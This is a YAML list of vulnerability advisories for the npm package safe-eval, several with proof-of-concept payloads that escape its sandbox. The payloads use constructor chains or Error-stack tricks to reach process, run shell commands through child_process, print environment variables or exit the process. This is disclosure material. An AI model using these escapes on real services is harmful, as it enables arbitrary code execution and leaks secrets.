---
- id: npmjs:npm:safe-eval:1033
  title: Sandbox Breakout / Arbitrary Code Execution
  description: "All versions of `safe-eval` are vulnerable to Sandbox Escape leading
    to Remote Code Execution. A payload chaining a function's callee and caller constructors
    can escape the sandbox and execute arbitrary code.  \n\nFor example, the payload
    \n```\n((() => { \nconst targetKey = Object.keys(this)[0]; \nObject.defineProperty(this,
    targetKey, { \nget: function() { \nreturn arguments.callee.caller.constructor(
    \n\"return global.process.mainModule.require('child_process').execSync('pwd').toString()\"
    \n)(); \n} \n}); \n})();```\nmay be used to print the `pwd` to the console."
  affected_package: safe-eval
  vulnerable_versions:
  - ">=0.0.0"
  severity: high
  package_manager: npm
  cwe: CWE-693
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: Lily Black
- id: npmjs:npm:safe-eval:1322
  title: Sandbox Breakout / Arbitrary Code Execution
  description: "All versions of `safe-eval` are vulnerable to Sandbox Escape leading
    to Remote Code Execution. The package fails to restrict access to the main context
    through Error objects. This may allow attackers to execute arbitrary code in the
    system. \n\nEvaluating the payload \n```\n(function (){\n  var ex = new Error\n
    \ ex.__proto__ = null\n  ex.stack = {\n    match: x => {\n      return x.constructor.constructor(\"throw
    process.env\")()\n    }\n  }\n  return ex\n})()\n``` \n\nprints the contents of
    `process.env`."
  affected_package: safe-eval
  vulnerable_versions:
  - ">=0.0.0"
  severity: high
  package_manager: npm
  cwe: CWE-693
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: posix
- id: npmjs:npm:safe-eval:337
  title: Sandbox Breakout
  description: "Affected versions of `safe-eval` are vulnerable to a sandbox escape.
    By accessing object constructors, un-sanitized user input can access the entire
    standard library and effectively break out of the sandbox. \n\n## Proof of Concept:\nThis
    code accesses the process object and calls `.exit()`\n```\nvar safeEval = require('safe-eval');\nsafeEval(\"this.constructor.constructor('return
    process')().exit()\");\n```"
  affected_package: safe-eval
  vulnerable_versions:
  - "<0.4.0"
  severity: high
  package_manager: npm
  cve:
  - CVE-2017-16088
  cwe: CWE-265
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: Alessandro Nadalin
- id: snykio:npm:safe-eval:20170830
  title: Sandbox Escaping
  description: |+
    \[`safe-eval`\] is a version of `eval`, claiming to be safer.

    Affected versions of this package are vulnerable to Sandbox Escaping.
    User input is not sanitized before being passed on to the safeEval
    function. A malicious user could access the object constructors,
    allowing access to the standard library, then escaping the sandbox.

    Proof of Concept:

        var safeEval = require('safe-eval');
        safeEval("this.constructor.constructor('return process')().exit()");

  affected_package: safe-eval
  vulnerable_versions:
  - "<0.4.0"
  severity: high
  package_manager: npm
  cve:
  - CVE-2017-16088
  cwe:
  - CWE-265
  disclosed_date: 2017-08-30
  created_date: 2017-09-06
  last_modified_date: 2017-09-06
  credit:
  - Alessandro Nadalin
  references:
  - https://github.com/hacksparrow/safe-eval/issues/5
  - https://github.com/patriksimek/vm2/issues/59
  source_url: https://snyk.io/vuln/npm:safe-eval:20170830
- id: snykio:npm:safe-eval:608076
  title: Sandbox Escape
  description: "[safe-eval][1] is a Safer version of eval()\n\nAffected versions of
    this package are vulnerable to Sandbox Escape. It\nis possible for an attacker
    to run an arbitrary command on the host\nmachine.\n\n### POC by Anirudh Anand
    (for node `12.13.0`)   {#poc-by-anirudh-anand-for-node-12130}\n\n    const safeEval
    = require('safe-eval');\n    \n    const theFunction = function() {\n       const
    bad = new Error();\n       bad.__proto__ = null;\n       bad.stack = {\n          match(outer)
    {\n             throw outer.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('whoami').toString();\n
    \         }\n       };\n       return bad;\n    };\n    \n    const untrusted
    = `(${theFunction})()`;\n    console.log(safeEval(untrusted));\n\n\n\n[1]: https://github.com/hacksparrow/safe-eval\n"
  affected_package: safe-eval
  vulnerable_versions:
  - "*"
  severity: high
  package_manager: npm
  cve:
  - CVE-2020-7710
  cwe:
  - CWE-265
  disclosed_date: 2020-02-28
  created_date: 2020-08-21
  last_modified_date: 2020-08-21
  credit:
  - Anirudh Anand
  references:
  - https://github.com/hacksparrow/safe-eval/issues/19
  source_url: https://snyk.io/vuln/SNYK-JS-SAFEEVAL-608076
